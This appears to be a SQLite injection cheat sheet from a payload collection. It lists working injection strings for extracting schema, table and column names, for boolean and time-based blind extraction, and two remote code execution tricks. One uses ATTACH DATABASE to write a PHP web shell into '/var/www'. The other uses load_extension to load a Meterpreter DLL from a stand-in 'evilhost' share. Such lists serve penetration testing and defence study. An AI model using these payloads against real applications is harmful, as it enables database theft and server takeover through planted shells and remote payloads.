# SQLite Injection

## Summary

* [SQLite comments](#sqlite-comments)
* [SQLite version](#sqlite-version)
* [String based - Extract database structure](#string-based---extract-database-structure)
* [Integer/String based - Extract table name](#integerstring-based---extract-table-name)
* [Integer/String based - Extract column name](#integerstring-based---extract-column-name)
* [Boolean - Count number of tables](#boolean---count-number-of-tables)
* [Boolean - Enumerating table name](#boolean---enumerating-table-name)
* [Boolean - Extract info](#boolean---extract-info)
* [Time based](#time-based)
* [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
* [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
* [References](#references)
## SQLite comments

```sql
--
/**/
```

## SQLite version

```sql
select sqlite_version();
```

## String based - Extract database structure

```sql
SELECT sql FROM sqlite_schema
```

## Integer/String based - Extract table name

```sql
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

Use limit X+1 offset X, to extract all tables.

## Integer/String based - Extract column name

```sql
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

For a clean output

```sql
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

## Boolean - Count number of tables

```sql
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
```

## Boolean - Enumerating table name

```sql
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
```

## Boolean - Extract info

```sql
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

## Time based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

## Remote Command Execution using SQLite command - Attach Database

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

## Remote Command Execution using SQLite command - Load_extension

```sql
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

Note: By default this component is disabled

## References

[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
